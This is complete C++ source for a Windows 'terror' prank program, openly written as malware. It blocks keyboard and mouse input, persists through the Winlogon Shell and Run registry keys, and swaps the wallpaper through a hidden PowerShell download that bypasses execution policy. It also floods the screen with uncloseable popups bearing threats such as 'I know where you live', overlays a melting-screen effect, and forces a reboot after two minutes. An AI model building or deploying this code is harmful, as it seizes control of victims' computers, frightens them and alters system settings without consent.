// terror.cpp
// Compilar: cl /EHsc /O2 terror.cpp user32.lib gdi32.lib shcore.lib advapi32.lib winmm.lib shell32.lib

#define _USE_MATH_DEFINES
#include <windows.h>
#include <shellscalingapi.h>
#include <shlobj.h>
#include <mmsystem.h>
#include <math.h>
#include <random>
#include <chrono>
#include <vector>
#include <thread>
#include <atomic>
#include <cstring>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shcore.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")

// ─────────────────────────────────────────────────────────────────────────────
//  CONFIGURAÇÃO
// ─────────────────────────────────────────────────────────────────────────────
static const bool BEEP_ENABLED = false;

// ─────────────────────────────────────────────────────────────────────────────
//  GLOBAIS
// ─────────────────────────────────────────────────────────────────────────────
static int  SW, SH;
static std::atomic<bool> g_running{true};
static std::mt19937      g_rng;
static HHOOK  g_hKeyHook    = nullptr;
static HHOOK  g_hMouseHook  = nullptr;
static HWND   g_hMeltWnd    = nullptr;
static BYTE*  g_wavBuf      = nullptr;
static DWORD  g_mainThreadId = 0;

const wchar_t RUN_KEY[]   = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t STATE_KEY[] = L"Software\\TrollTerror";
const wchar_t WALL_URL[]  = L"https://upload.wikimedia.org/wikipedia/en/b/ba/The_Terror_of_War.jpg";

// 7 mensagens de terror rotativas
const wchar_t* MSGS[] = {
    L"\u26A0   N\u00C3O CORRA... eu te observo   \u26A0",
    L"\u2620   SISTEMA COMPROMETIDO   \u2620",
    L"\u274C   ERRO CR\u00CDTICO \u2014 SEUS DADOS FORAM ACESSADOS   \u274C",
    L"\u26A0   EU JA SEI ONDE VOCE MORA   \u26A0",
    L"\u2620   FORMATA\u00C7\u00C3O EM PROGRESSO... 47%   \u2620",
    L"\u274C   SENHA DETECTADA \u2014 ENVIANDO...   \u274C",
    L"\u26A0   VOC\u00CA N\u00C3O PODE ESCAPAR   \u26A0",
};
const int MSG_COUNT = 7;

// ─────────────────────────────────────────────────────────────────────────────
//  REGISTRO
// ─────────────────────────────────────────────────────────────────────────────
static void SaveWstr(const wchar_t* sub, const wchar_t* val, const wchar_t* data) {
    HKEY k; RegCreateKeyExW(HKEY_CURRENT_USER,sub,0,nullptr,0,KEY_SET_VALUE,nullptr,&k,nullptr);
    RegSetValueExW(k,val,0,REG_SZ,(BYTE*)data,(DWORD)((wcslen(data)+1)*sizeof(wchar_t)));
    RegCloseKey(k); }
static bool LoadWstr(const wchar_t* sub, const wchar_t* val, wchar_t* out, DWORD bytes) {
    HKEY k; if(RegOpenKeyExW(HKEY_CURRENT_USER,sub,0,KEY_READ,&k)) return false;
    bool ok=!RegQueryValueExW(k,val,nullptr,nullptr,(BYTE*)out,&bytes); RegCloseKey(k); return ok; }
static void SaveOriginalWallpaper() {
    wchar_t buf[MAX_PATH]={}; SystemParametersInfoW(SPI_GETDESKWALLPAPER,MAX_PATH,buf,0);
    SaveWstr(STATE_KEY,L"OrigWall",buf); }
static void RestoreOriginalWallpaper() {
    wchar_t buf[MAX_PATH]={};
    if(LoadWstr(STATE_KEY,L"OrigWall",buf,sizeof(buf))&&buf[0])
        SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,buf,SPIF_UPDATEINIFILE|SPIF_SENDCHANGE); }

// ─────────────────────────────────────────────────────────────────────────────
//  HELPER
// ─────────────────────────────────────────────────────────────────────────────
static void RunHidden(const wchar_t* cmdline, bool wait=false) {
    STARTUPINFOW si={sizeof(si)}; si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={}; wchar_t buf[1024]; wcscpy_s(buf,cmdline);
    if(CreateProcessW(nullptr,buf,nullptr,nullptr,FALSE,CREATE_NO_WINDOW,nullptr,nullptr,&si,&pi)){
        if(wait) WaitForSingleObject(pi.hProcess,10000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread); } }

static bool IsStartedFromBat(LPSTR cmd) { return cmd && strstr(cmd,"/bat") != nullptr; }

static void MakeRandomName(wchar_t* out, int len) {
    SYSTEMTIME st; GetSystemTime(&st);
    DWORD seed = st.wMilliseconds^(GetCurrentProcessId()<<4)^(st.wSecond<<8)^(st.wMinute<<16);
    swprintf_s(out,len,L"%08X",seed^GetTickCount()); }

// ─────────────────────────────────────────────────────────────────────────────
//  PERSISTÊNCIA
//  Método 1: HKCU\Winlogon\Shell  →  roda JUNTO com Explorer (imediato no login)
//  Método 2: HKCU\Run + StartupDelayInMSec=0  →  backup
// ─────────────────────────────────────────────────────────────────────────────
static void RegisterPersistence(const wchar_t* exePath) {
    // ── MÉTODO 1: Shell key ────────────────────────────────────────────────────
    // Winlogon lê HKCU\Winlogon\Shell e lança terror.exe NO MESMO INSTANTE que
    // o Explorer — resultado: troll inicia IMEDIATAMENTE ao fazer login
    {
        wchar_t shellVal[MAX_PATH+64];
        swprintf_s(shellVal, L"explorer.exe,\"%s\" /bat", exePath);
        HKEY ksh;
        if(!RegCreateKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            0,nullptr,0,KEY_SET_VALUE,nullptr,&ksh,nullptr)) {
            RegSetValueExW(ksh,L"Shell",0,REG_SZ,
                (BYTE*)shellVal,(DWORD)((wcslen(shellVal)+1)*sizeof(wchar_t)));
            RegCloseKey(ksh);
        }
    }
    // ── MÉTODO 2: HKCU\Run (backup caso Shell key seja deletado) ───────────────
    {
        wchar_t oldName[64]={};
        if(LoadWstr(STATE_KEY,L"RunName",oldName,sizeof(oldName))&&oldName[0]) {
            HKEY k; if(!RegOpenKeyExW(HKEY_CURRENT_USER,RUN_KEY,0,KEY_SET_VALUE,&k)){
                RegDeleteValueW(k,oldName); RegCloseKey(k); } }
        wchar_t randName[32]; MakeRandomName(randName,32);
        wchar_t cmd[MAX_PATH+16]; swprintf_s(cmd,L"\"%s\" /bat",exePath);
        HKEY k; if(!RegOpenKeyExW(HKEY_CURRENT_USER,RUN_KEY,0,KEY_SET_VALUE,&k)){
            RegSetValueExW(k,randName,0,REG_SZ,(BYTE*)cmd,(DWORD)((wcslen(cmd)+1)*sizeof(wchar_t)));
            RegCloseKey(k); }
        SaveWstr(STATE_KEY,L"RunName",randName);
    }
    // ── Zera delay do HKCU\Run ────────────────────────────────────────────────
    {
        HKEY ks;
        if(!RegCreateKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize",
            0,nullptr,0,KEY_SET_VALUE,nullptr,&ks,nullptr)){
            DWORD zero=0;
            RegSetValueExW(ks,L"StartupDelayInMSec",0,REG_DWORD,(BYTE*)&zero,sizeof(zero));
            RegCloseKey(ks);
        }
    }
}

static void UnregisterPersistence() {
    // Remove Shell key (restaura comportamento padrão)
    {
        HKEY ksh;
        if(!RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            0,KEY_SET_VALUE,&ksh)){
            RegDeleteValueW(ksh,L"Shell"); RegCloseKey(ksh); }
    }
    // Remove HKCU\Run
    {
        wchar_t name[64]={};
        if(LoadWstr(STATE_KEY,L"RunName",name,sizeof(name))&&name[0]){
            HKEY k; if(!RegOpenKeyExW(HKEY_CURRENT_USER,RUN_KEY,0,KEY_SET_VALUE,&k)){
                RegDeleteValueW(k,name); RegCloseKey(k); } }
        SaveWstr(STATE_KEY,L"RunName",L"");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  HOOKS — no main thread (tem PeekMessageW rodando → nunca dão timeout)
//  BlockInput + ClipCursor = teclado E cursor completamente travados
// ─────────────────────────────────────────────────────────────────────────────
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode>=0) {
        auto* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if(kbd->vkCode==VK_INSERT && wParam==WM_KEYDOWN) {
            g_running = false;
            ClipCursor(nullptr);
            BlockInput(FALSE);
            PostQuitMessage(0);
        }
        return 1; }
    return CallNextHookEx(nullptr,nCode,wParam,lParam); }

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return (nCode>=0) ? 1 : CallNextHookEx(nullptr,nCode,wParam,lParam); }

static void InstallHooks() {
    g_hKeyHook   = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL,    MouseProc,    nullptr, 0);
    ShowCursor(FALSE); }

static void LockInputFull() {
    // BlockInput exige foco — deve ser chamado após SetForegroundWindow
    BlockInput(TRUE);
    // ClipCursor trava o cursor (WH_MOUSE_LL bloqueia cliques mas não movimento)
    RECT r = {SW/2, SH/2, SW/2+1, SH/2+1};
    ClipCursor(&r); }

// ─────────────────────────────────────────────────────────────────────────────
//  SHOW DESKTOP
// ─────────────────────────────────────────────────────────────────────────────
static BOOL CALLBACK MinimizeAllProc(HWND hwnd, LPARAM) {
    if(!IsWindowVisible(hwnd)||IsIconic(hwnd)) return TRUE;
    wchar_t cls[64]={}; GetClassNameW(hwnd,cls,64);
    if(!wcscmp(cls,L"Shell_TrayWnd")||!wcscmp(cls,L"Progman")||!wcscmp(cls,L"WorkerW")) return TRUE;
    ShowWindow(hwnd,SW_MINIMIZE); return TRUE; }
static void ShowDesktop() {
    HWND hTray=FindWindowW(L"Shell_TrayWnd",nullptr);
    if(hTray) SendMessageW(hTray,WM_COMMAND,(WPARAM)0x7402,0);
    EnumWindows(MinimizeAllProc,0); Sleep(400); }

// ─────────────────────────────────────────────────────────────────────────────
//  WALLPAPER — BMP vermelho instantâneo + JPG real em background
// ─────────────────────────────────────────────────────────────────────────────
static wchar_t g_bmpPath[MAX_PATH]={};
static void SetFallbackWallpaperNow() {
    const int rs=((SW*3+3)&~3); DWORD ds=(DWORD)(rs*SH);
    BYTE* px=(BYTE*)calloc(ds,1); if(!px) return;
    for(int y=0;y<SH;y++) {
        BYTE r=(BYTE)(8+(SH-1-y)*70/SH);
        for(int x=0;x<SW;x++) { int i=y*rs+x*3; px[i]=0; px[i+1]=0; px[i+2]=r; } }
    GetTempPathW(MAX_PATH,g_bmpPath); wcscat_s(g_bmpPath,L"hwall.bmp");
    BITMAPFILEHEADER fh={}; fh.bfType=0x4D42;
    fh.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER); fh.bfSize=fh.bfOffBits+ds;
    BITMAPINFOHEADER ih={}; ih.biSize=sizeof(ih); ih.biWidth=SW; ih.biHeight=SH;
    ih.biPlanes=1; ih.biBitCount=24; ih.biCompression=BI_RGB; ih.biSizeImage=ds;
    HANDLE hf=CreateFileW(g_bmpPath,GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,0,nullptr);
    if(hf!=INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hf,&fh,sizeof(fh),&w,nullptr);
        WriteFile(hf,&ih,sizeof(ih),&w,nullptr);
        WriteFile(hf,px,ds,&w,nullptr); CloseHandle(hf);
        SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,g_bmpPath,SPIF_UPDATEINIFILE|SPIF_SENDCHANGE); }
    free(px); }

static void DownloadWallpaperAsync() {
    wchar_t tmpDir[MAX_PATH], jpgPath[MAX_PATH], ps1Path[MAX_PATH];
    GetTempPathW(MAX_PATH,tmpDir);
    wcscpy_s(jpgPath,tmpDir); wcscat_s(jpgPath,L"hwall.jpg");
    wcscpy_s(ps1Path,tmpDir); wcscat_s(ps1Path,L"hwall.ps1");
    char jpgA[MAX_PATH], urlA[512];
    WideCharToMultiByte(CP_ACP,0,jpgPath,-1,jpgA,MAX_PATH,nullptr,nullptr);
    WideCharToMultiByte(CP_ACP,0,WALL_URL,-1,urlA,512,nullptr,nullptr);
    char ps1[2048];
    sprintf_s(ps1,
        "[Net.ServicePointManager]::SecurityProtocol='Tls12'\r\n"
        "$ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'\r\n"
        "try{Invoke-WebRequest -Uri '%s' -OutFile '%s' -UserAgent $ua}catch{}\r\n",urlA,jpgA);
    HANDLE hf=CreateFileW(ps1Path,GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,0,nullptr);
    if(hf!=INVALID_HANDLE_VALUE) { DWORD w; WriteFile(hf,ps1,(DWORD)strlen(ps1),&w,nullptr); CloseHandle(hf); }
    wchar_t psCmd[MAX_PATH+80];
    swprintf_s(psCmd,L"powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \"%s\"",ps1Path);
    STARTUPINFOW si={sizeof(si)}; si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={};
    if(CreateProcessW(nullptr,psCmd,nullptr,nullptr,FALSE,CREATE_NO_WINDOW,nullptr,nullptr,&si,&pi)){
        WaitForSingleObject(pi.hProcess,20000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    DeleteFileW(ps1Path);
    WIN32_FILE_ATTRIBUTE_DATA fa={};
    if(GetFileAttributesExW(jpgPath,GetFileExInfoStandard,&fa)&&fa.nFileSizeLow>10240)
        SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,jpgPath,SPIF_UPDATEINIFILE|SPIF_SENDCHANGE); }

// ─────────────────────────────────────────────────────────────────────────────
//  BEEP
// ─────────────────────────────────────────────────────────────────────────────
static void InitBeepWav() {
    const int SR=44100, FREQ=1000, CYCLES=10, SAMPLES=SR/FREQ*CYCLES, DATA_SIZE=SAMPLES*2;
    #pragma pack(push,1)
    struct WavHdr { char riff[4]; DWORD riffSz; char wave[4]; char fmt_[4]; DWORD fmtSz;
        WORD fmtTag,channels; DWORD sampleRate,byteRate; WORD blockAlign,bits;
        char data[4]; DWORD dataSz; };
    #pragma pack(pop)
    int total=(int)sizeof(WavHdr)+DATA_SIZE; g_wavBuf=new BYTE[total]();
    WavHdr* h=(WavHdr*)g_wavBuf;
    memcpy(h->riff,"RIFF",4); h->riffSz=total-8; memcpy(h->wave,"WAVE",4);
    memcpy(h->fmt_,"fmt ",4); h->fmtSz=16; h->fmtTag=1; h->channels=1;
    h->sampleRate=SR; h->byteRate=SR*2; h->blockAlign=2; h->bits=16;
    memcpy(h->data,"data",4); h->dataSz=DATA_SIZE;
    short* s=(short*)(g_wavBuf+sizeof(WavHdr));
    for(int i=0;i<SAMPLES;i++) s[i]=(short)(30000.0*sin(2.0*M_PI*FREQ*i/SR)); }
static void StartBeep() {
    if(!BEEP_ENABLED||!g_wavBuf) return;
    PlaySoundW((LPCWSTR)g_wavBuf,nullptr,SND_MEMORY|SND_LOOP|SND_ASYNC|SND_NODEFAULT); }
static void StopBeep() { if(BEEP_ENABLED) PlaySoundW(nullptr,nullptr,0); }

// ─────────────────────────────────────────────────────────────────────────────
//  MELT WINDOW
// ─────────────────────────────────────────────────────────────────────────────
LRESULT CALLBACK MeltWndProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    if(msg==WM_CLOSE||(msg==WM_SYSCOMMAND&&(wp&0xFFF0)==SC_CLOSE)) return 0;
    if(msg==WM_PAINT) { PAINTSTRUCT ps; BeginPaint(hWnd,&ps); EndPaint(hWnd,&ps); return 0; }
    if(msg==WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProcW(hWnd,msg,wp,lp); }

// ─────────────────────────────────────────────────────────────────────────────
//  POPUP — não se destroem, acumulam, 7 mensagens diferentes
// ─────────────────────────────────────────────────────────────────────────────
const wchar_t POP_CLS[] = L"TerrorPop";

static COLORREF PopBgColor(int i)     { COLORREF t[]={RGB(10,0,0),RGB(0,0,15),RGB(15,0,0),RGB(8,0,8),RGB(0,10,0),RGB(20,0,0),RGB(5,5,0)}; return t[i%7]; }
static COLORREF PopBorderColor(int i) { COLORREF t[]={RGB(200,0,0),RGB(0,0,200),RGB(220,20,20),RGB(180,0,180),RGB(0,180,0),RGB(255,50,0),RGB(200,200,0)}; return t[i%7]; }

LRESULT CALLBACK PopupWndProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch(msg) {
    case WM_CREATE:
        SetWindowLongPtrW(hWnd,GWLP_USERDATA,(LONG_PTR)((CREATESTRUCT*)lp)->lpCreateParams);
        return 0;
    case WM_ERASEBKGND: return 1;
    case WM_PAINT: {
        int idx=(int)GetWindowLongPtrW(hWnd,GWLP_USERDATA);
        PAINTSTRUCT ps; HDC hdc=BeginPaint(hWnd,&ps);
        RECT rc; GetClientRect(hWnd,&rc);
        HBRUSH bg=CreateSolidBrush(PopBgColor(idx)); FillRect(hdc,&rc,bg); DeleteObject(bg);
        HPEN pen=CreatePen(PS_SOLID,5,PopBorderColor(idx));
        SelectObject(hdc,pen); SelectObject(hdc,GetStockObject(NULL_BRUSH));
        Rectangle(hdc,3,3,rc.right-3,rc.bottom-3); DeleteObject(pen);
        HPEN pen2=CreatePen(PS_SOLID,1,PopBorderColor(idx));
        SelectObject(hdc,pen2); Rectangle(hdc,8,8,rc.right-8,rc.bottom-8); DeleteObject(pen2);
        HFONT fnt=CreateFontW(40,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,ANTIALIASED_QUALITY,DEFAULT_PITCH,L"Arial");
        SelectObject(hdc,fnt); SetBkMode(hdc,TRANSPARENT); SetTextColor(hdc,RGB(255,40,40));
        DrawTextW(hdc,MSGS[idx%MSG_COUNT],-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
        DeleteObject(fnt); EndPaint(hWnd,&ps); return 0; }
    case WM_CLOSE:     return 0;
    case WM_SYSCOMMAND: if((wp&0xFFF0)==SC_CLOSE) return 0; break; }
    return DefWindowProcW(hWnd,msg,wp,lp); }

void PopupFloodThread() {
    WNDCLASSW wc={}; wc.lpfnWndProc=PopupWndProc;
    wc.hInstance=GetModuleHandleW(nullptr); wc.lpszClassName=POP_CLS;
    RegisterClassW(&wc);
    std::uniform_int_distribution<int> rx(0,SW>720?SW-720:0);
    std::uniform_int_distribution<int> ry(0,SH>130?SH-130:0);
    std::mt19937 rng((unsigned)GetTickCount());
    DWORD lastSpawn=0; int spawnIdx=0;
    while(g_running) {
        DWORD now=GetTickCount();
        if(now-lastSpawn>=10) {
            int px=rx(rng), py=ry(rng);
            int msgIdx=spawnIdx%MSG_COUNT;
            HWND hw=CreateWindowExW(
                WS_EX_TOPMOST|WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
                POP_CLS,L"",WS_POPUP,px,py,740,140,
                nullptr,nullptr,GetModuleHandleW(nullptr),(LPVOID)(INT_PTR)msgIdx);
            if(hw) {
                SetWindowPos(hw,HWND_TOPMOST,px,py,740,140,
                    SWP_SHOWWINDOW|SWP_NOACTIVATE|SWP_NOSENDCHANGING);
                UpdateWindow(hw); spawnIdx++; }
            lastSpawn=now; }
        MSG m;
        while(PeekMessageW(&m,nullptr,0,0,PM_REMOVE)) {
            if(m.message==WM_QUIT) { g_running=false; break; }
            TranslateMessage(&m); DispatchMessageW(&m); }
        Sleep(1); } }

// ─────────────────────────────────────────────────────────────────────────────
//  WINMAIN
// ─────────────────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR lpCmdLine, int) {
    g_mainThreadId = GetCurrentThreadId();
    SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
    SW = GetSystemMetrics(SM_CXSCREEN);
    SH = GetSystemMetrics(SM_CYSCREEN);
    g_rng.seed((unsigned)std::chrono::high_resolution_clock::now().time_since_epoch().count());
    InitBeepWav();

    // ★ Hooks no main thread — PeekMessageW roda aqui, nunca dão timeout ★
    InstallHooks();

    // Janela 1x1 para roubar foco → BlockInput funciona imediatamente
    WNDCLASSW wcLock={};
    wcLock.lpfnWndProc=DefWindowProcW; wcLock.hInstance=hInst; wcLock.lpszClassName=L"LockWin";
    RegisterClassW(&wcLock);
    HWND hLock=CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
        L"LockWin",L"",WS_POPUP,SW/2,SH/2,1,1,nullptr,nullptr,hInst,nullptr);
    ShowWindow(hLock,SW_SHOW);
    SetForegroundWindow(hLock);
    LockInputFull(); // ← teclado + cursor travados AGORA

    bool fromBat = IsStartedFromBat(lpCmdLine);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr,exePath,MAX_PATH);

    if(!fromBat) {
        RegisterPersistence(exePath);
        SaveOriginalWallpaper();
        SetFallbackWallpaperNow();                      // BMP vermelho instantâneo
        std::thread(DownloadWallpaperAsync).detach();   // JPG real em background
        ShowDesktop();
    }

    StartBeep();

    // ── FASE 1: popups aparecem por 500ms enquanto captura a tela ───────────
    // Melt começa IMEDIATAMENTE — popups continuam em paralelo durante o melt
    std::thread(PopupFloodThread).detach();
    {
        DWORD t0=GetTickCount();
        MSG m;
        while(g_running && (GetTickCount()-t0)<500) {
            if(PeekMessageW(&m,nullptr,0,0,PM_REMOVE)) {
                if(m.message==WM_QUIT) { g_running=false; break; }
                TranslateMessage(&m); DispatchMessageW(&m); } }
    }

    if(!g_running) goto cleanup;

    // ── FASE 2: captura tela e inicia melt com ondas ──────────────────────────
    {
        BITMAPINFO bmi={};
        bmi.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth=SW; bmi.bmiHeader.biHeight=-SH;
        bmi.bmiHeader.biPlanes=1; bmi.bmiHeader.biBitCount=32;
        bmi.bmiHeader.biCompression=BI_RGB;
        void* pPixels=nullptr;
        HDC hDIBDC=CreateCompatibleDC(nullptr);
        HBITMAP hDIB=CreateDIBSection(hDIBDC,&bmi,DIB_RGB_COLORS,&pPixels,nullptr,0);
        SelectObject(hDIBDC,hDIB);
        HDC hScrDC=GetDC(nullptr);
        BitBlt(hDIBDC,0,0,SW,SH,hScrDC,0,0,SRCCOPY);
        ReleaseDC(nullptr,hScrDC);

        const wchar_t MELT_CLS[]=L"MeltCls";
        WNDCLASSW wc2={}; wc2.lpfnWndProc=MeltWndProc; wc2.hInstance=hInst;
        wc2.lpszClassName=MELT_CLS; wc2.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
        RegisterClassW(&wc2);
        g_hMeltWnd=CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW,
            MELT_CLS,L"",WS_POPUP,0,0,SW,SH,nullptr,nullptr,hInst,nullptr);
        ShowWindow(g_hMeltWnd,SW_SHOW);
        SetWindowPos(g_hMeltWnd,HWND_TOPMOST,0,0,SW,SH,SWP_SHOWWINDOW);
        SetForegroundWindow(g_hMeltWnd);
        DestroyWindow(hLock);
        LockInputFull(); // reforço após ter foco da janela de melt

        // Shutdown em 120s
        if(!fromBat) {
            std::thread([](){
                Sleep(120000);
                if(g_running.load())
                    RunHidden(L"C:\\Windows\\System32\\shutdown.exe /r /t 10 /f");
            }).detach(); }

        // Buffer de drip + buffer de onda (separados)
        void* wavePixels=nullptr;
        HDC hWaveDC=CreateCompatibleDC(nullptr);
        HBITMAP hWaveBmp=CreateDIBSection(hWaveDC,&bmi,DIB_RGB_COLORS,&wavePixels,nullptr,0);
        SelectObject(hWaveDC,hWaveBmp);

        DWORD* px=(DWORD*)pPixels;
        DWORD* wp=(DWORD*)wavePixels;

        // Colunas de drip — lentas e assustadoras
        struct Col { int x,w,dropped,speed; float chance; };
        std::vector<Col> cols;
        { std::uniform_int_distribution<int> wd(1,3), sd(1,2);
          std::uniform_real_distribution<float> cd(0.005f,0.04f);
          for(int x=0;x<SW;) {
              Col c; c.x=x; c.w=wd(g_rng);
              if(x+c.w>SW) c.w=SW-x; c.dropped=0; c.speed=sd(g_rng); c.chance=cd(g_rng);
              cols.push_back(c); x+=c.w; } }

        std::uniform_real_distribution<float> roll(0.0f,1.0f);
        MSG msg={};
        while(g_running) {
            while(PeekMessageW(&msg,nullptr,0,0,PM_REMOVE)) {
                if(msg.message==WM_QUIT) { g_running=false; break; }
                TranslateMessage(&msg); DispatchMessageW(&msg); }
            if(!g_running) break;

            // Drip: colunas caem para baixo
            for(auto& c:cols) {
                if(c.dropped>=SH||roll(g_rng)>c.chance) continue;
                int sh=c.speed; if(c.dropped+sh>SH) sh=SH-c.dropped;
                for(int col=c.x;col<c.x+c.w;++col) {
                    for(int y=SH-1;y>=sh;--y) px[y*SW+col]=px[(y-sh)*SW+col];
                    for(int y=0;y<sh;++y)     px[y*SW+col]=0xFF000000; }
                c.dropped+=sh; }

            // GLITCH: bandas horizontais com deslocamento lateral grande
            // Divide a tela em faixas de alturas variadas, cada uma deslocada L/R
            // Semente muda a cada 150ms → novo padrão de glitch periodicamente
            // Resultado: efeito blocado/fragmentado como nas imagens de referência
            DWORD glitchSeed = GetTickCount() / 150;
            std::mt19937 bRng(glitchSeed);
            std::uniform_int_distribution<int> bh_dist(2, 28);     // altura da faixa
            std::uniform_int_distribution<int> disp_dist(-140, 140); // deslocamento
            std::uniform_int_distribution<int> prob_dist(0, 3);     // 1/4 faixas deslocadas

            memcpy(wp, px, SW * SH * sizeof(DWORD)); // começa com frame atual do drip
            int yy = 0;
            while(yy < SH) {
                int bh = bh_dist(bRng);
                // ~25% de chance de deslocamento grande, ~75% sem deslocamento
                int disp = (prob_dist(bRng) == 0) ? disp_dist(bRng) : 0;
                for(int by = yy; by < yy + bh && by < SH; by++) {
                    for(int x = 0; x < SW; x++) {
                        int sx = x + disp;
                        // fora dos limites → preto (cria a borda jagged)
                        wp[by*SW+x] = (sx>=0 && sx<SW) ? px[by*SW+sx] : 0xFF000000;
                    }
                }
                yy += bh;
            }


            HDC hWDC=GetDC(g_hMeltWnd);
            BitBlt(hWDC,0,0,SW,SH,hWaveDC,0,0,SRCCOPY);
            ReleaseDC(g_hMeltWnd,hWDC);
            SetWindowPos(g_hMeltWnd,HWND_TOPMOST,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
            Sleep(32); }

        DeleteObject(hWaveBmp); DeleteDC(hWaveDC);
        DeleteObject(hDIB); DeleteDC(hDIBDC);
        DestroyWindow(g_hMeltWnd);
        UnregisterClassW(MELT_CLS,hInst);
    }

cleanup:
    ClipCursor(nullptr);
    BlockInput(FALSE);
    g_running = false;
    if(g_hKeyHook)   { UnhookWindowsHookEx(g_hKeyHook);   g_hKeyHook=nullptr; }
    if(g_hMouseHook) { UnhookWindowsHookEx(g_hMouseHook); g_hMouseHook=nullptr; }
    StopBeep();
    ShowCursor(TRUE);
    RunHidden(L"C:\\Windows\\System32\\shutdown.exe /a");
    UnregisterPersistence();
    RestoreOriginalWallpaper();
    delete[] g_wavBuf;
    return 0;
}
